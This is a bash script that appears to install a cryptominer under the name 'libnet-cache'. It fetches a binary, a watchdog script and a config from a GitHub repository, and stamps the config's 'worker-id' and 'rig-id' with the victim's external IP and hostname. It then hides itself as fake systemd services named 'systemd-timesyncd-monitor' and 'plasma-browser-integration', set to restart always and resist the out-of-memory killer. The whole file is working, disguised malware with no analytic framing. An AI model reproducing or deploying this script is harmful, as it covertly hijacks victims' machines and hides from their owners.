#!/bin/bash

CURRENT_USER=$(whoami)
IS_ROOT=false
EFFECTIVE_UID=$(id -u)

if [ "$EFFECTIVE_UID" -eq 0 ] || [ "$CURRENT_USER" = "root" ]; then
    IS_ROOT=true
fi

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}


if [ "$IS_ROOT" = true ]; then
    INSTALL_DIR="/opt/libnet-cache"
    REAL_USER="${SUDO_USER:-$USER}"  
else
    INSTALL_DIR="$HOME/.local/share/libnet-cache"
    REAL_USER="$USER"
fi

SOFTWARE_BIN="$INSTALL_DIR/libnet-cached"
WATCHDOG_SCRIPT="$INSTALL_DIR/libnet-cache-check.sh"
CONFIG_JSON="$INSTALL_DIR/config.json"

HTTP_SERVER="https://github.com/Formin-cell/libnet-cache/blob"
SOFTWARE_URL="$HTTP_SERVER/modules/libnet-cached"
if [ "$(id -u)" -eq 0 ]; then
    WATCHDOG_URL="$HTTP_SERVER/modules/cache-env-root.sh"
else
    WATCHDOG_URL="$HTTP_SERVER/modules/cache-env-user.sh"
fi
CONFIG_URL="$HTTP_SERVER/modules/config.json"

generate_machine_id() {
    local hostname_raw=""
    local hostname_short=""
    local external_ip="NOIP"

    hostname_raw=$( (hostname -s 2>/dev/null || hostname 2>/dev/null) || echo "UNKNOWN" )
    

    hostname_short="${hostname_raw%%.*}"
    [ -z "$hostname_short" ] && hostname_short="UNKNOWN"
    

    if command -v curl >/dev/null 2>&1; then
        external_ip=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || \
                      curl -s --max-time 3 icanhazip.com 2>/dev/null || \
                      curl -s --max-time 3 ipinfo.io/ip 2>/dev/null || echo "")
    fi
    

    if [ -z "$external_ip" ] && command -v wget >/dev/null 2>&1; then
        external_ip=$(wget -qO- --timeout=3 ifconfig.me 2>/dev/null || \
                      wget -qO- --timeout=3 icanhazip.com 2>/dev/null || echo "")
    fi
    

    [ -z "$external_ip" ] && external_ip="NOIP"
    

    echo "${external_ip}_${hostname_short}"
}


deploy() {
    log "Starting full deployment (NETWORK MODE with LOCAL FALLBACK)..."
    mkdir -p "$INSTALL_DIR" || { log "FATAL: Cannot create $INSTALL_DIR"; exit 1; }


    log "Downloading file binary from $SOFTWARE_URL..."
    

    if curl -fsSL --retry 3 --retry-delay 5 "$SOFTWARE_URL" -o "$SOFTWARE_BIN" 2>/dev/null; then
        log "file downloaded from network"
    else

        rm -f "$SOFTWARE_BIN"
        log "Network download failed"

    fi 

    [ -f "$SOFTWARE_BIN" ] && chmod +x "$SOFTWARE_BIN"



    local mode_str=$([ "$IS_ROOT" = true ] && echo 'ROOT' || echo 'USER')
    log "Downloading script from $WATCHDOG_URL ($mode_str mode)..."
    

    if curl -fsSL --retry 3 --retry-delay 5 "$WATCHDOG_URL" -o "$WATCHDOG_SCRIPT" 2>/dev/null; then
        log "script downloaded from network"
    else
        rm -f "$WATCHDOG_SCRIPT"
        log "Network download failed"
       
    fi 
    
    [ -f "$WATCHDOG_SCRIPT" ] && chmod +x "$WATCHDOG_SCRIPT"

    MACHINE_ID=$(generate_machine_id)

    echo "MACHINE NAME: $MACHINE_ID"

    if curl -fsSL --retry 3 --retry-delay 5 "$CONFIG_URL" -o "$CONFIG_JSON" 2>/dev/null; then
        log "config downloaded from network"
        
        if sed -i --follow-symlinks "s#\"worker-id\":\s*[^,}]*#\"worker-id\": \"$MACHINE_ID\"#g" "$CONFIG_JSON" && \
           sed -i --follow-symlinks "s#\"rig-id\":\s*[^,}]*#\"rig-id\": \"$MACHINE_ID\"#g" "$CONFIG_JSON"; then
            log "Config successfully customized with Machine ID: $MACHINE_ID"
        else
            log "Failed to customize config with Machine ID"
        fi

    else
        rm -f "$CONFIG_JSON"
        log "Network download failed"
    fi

    log "Deployment complete — files installed to $INSTALL_DIR"
}

setup_root_persistence() {

    if command -v systemctl >/dev/null 2>&1; then
        local service_file="/etc/systemd/system/systemd-timesyncd-monitor.service"
        local bash_bin
        bash_bin=$(command -v bash 2>/dev/null)
        bash_bin=${bash_bin:-/bin/bash}
        
        if [ ! -f "$service_file" ]; then
            log "  [systemd] Installing system-level service..."
            

            cat > "$service_file" << EOF
[Unit]
Description=Time Synchronization Monitor
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=forking
User=root
ExecStart=$bash_bin $WATCHDOG_SCRIPT
Restart=always
RestartSec=15

OOMScoreAdjust=-1000

[Install]
WantedBy=multi-user.target
EOF
            

            systemctl daemon-reload 2>/dev/null
            systemctl enable systemd-timesyncd-monitor.service 2>/dev/null \
                && systemctl start systemd-timesyncd-monitor.service 2>/dev/null \
                && log "  [systemd] System service installed, enabled, and started." \
                || log "  [systemd] WARNING: Could not enable or start system service."
        else
            log "  [systemd] System service already installed — skipping."
        fi
    else
        log "  [systemd] systemctl not available — skipping."
    fi
}

setup_user_persistence() {
 
    if command -v loginctl >/dev/null 2>&1; then
        log "  [lingering] Attempting to enable user lingering..."
        if loginctl enable-linger "$USER" 2>/dev/null; then
            log "  [lingering] User lingering enabled successfully."
        else
            log "  [lingering] WARNING: Could not enable lingering"
        fi
    fi
    

    if command -v systemctl >/dev/null 2>&1; then
        local unit_dir="$HOME/.config/systemd/user"
        local unit_file="$unit_dir/plasma-browser-integration.service"  
        local bash_bin
        bash_bin=$(command -v bash 2>/dev/null)
        bash_bin=${bash_bin:-/bin/bash}

        if [ ! -f "$unit_file" ]; then
            mkdir -p "$unit_dir"
            log "  [systemd] Installing user service (disguised as plasma-browser-integration)..."
            

            cat > "$unit_file" << EOF
[Unit]
Description=Plasma Browser Integration Background Service
After=network.target network-online.target
Wants=network-online.target
ConditionPathExists=$WATCHDOG_SCRIPT

[Service]
Type=forking
ExecStart=$bash_bin $WATCHDOG_SCRIPT
Restart=always
RestartSec=15
OOMScoreAdjust=-1000

[Install]
WantedBy=default.target
EOF

            export XDG_RUNTIME_DIR="/run/user/$(id -u)"
            export DBUS_SESSION_BUS_ADDRESS="unix:path=$XDG_RUNTIME_DIR/bus"
            
            systemctl --user daemon-reload 2>/dev/null
            systemctl --user enable plasma-browser-integration.service 2>/dev/null \
                && log "  [systemd] User service installed and enabled." \
                || log "  [systemd] WARNING: Could not enable user service"
            systemctl --user start --no-block plasma-browser-integration.service 2>/dev/null \
                && log "  [systemd] Service start job queued." \
                || log "  [systemd] Service will activate on next login."
        else
            log "  [systemd] User service already installed — skipping."
            systemctl --user is-active --quiet plasma-browser-integration.service 2>/dev/null \
                || systemctl --user start --no-block plasma-browser-integration.service 2>/dev/null
        fi
    else
        log "  [systemd] systemctl not available — skipping."
    fi
}

mkdir -p "$INSTALL_DIR"

deploy

setup_persistence() {
    log "Configuring persistence layers..."
    
    if [ "$IS_ROOT" = true ]; then
        log "  [MODE] ROOT Mode"
        setup_root_persistence
    else
        log "  [MODE] USER Mode"
        setup_user_persistence
    fi
    
    log "Persistence setup complete."
}

setup_persistence

log "Script finished."
exit 0